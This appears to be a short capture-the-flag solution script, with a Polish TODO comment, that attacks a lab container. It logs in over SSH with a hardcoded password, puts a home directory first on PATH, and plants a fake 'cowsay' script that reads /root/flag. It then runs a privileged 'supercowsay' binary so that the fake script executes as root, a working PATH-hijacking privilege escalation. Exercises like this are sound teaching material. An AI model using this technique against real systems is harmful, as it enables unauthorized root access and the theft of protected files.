# TODO ZMIENIC IP NA NIE WIE JAKIE
ip=172.17.0.3
port=43422

commands="
export PATH=/home/guest:\$PATH;
echo -e \"#!/bin/bash\ncat /root/flag\n\" > /home/guest/cowsay;
chmod +x /home/guest/cowsay;
/home/guest/supercowsay"

sshpass -p beautiful1 ssh -o IdentitiesOnly=yes guest@$ip -p $port "$commands"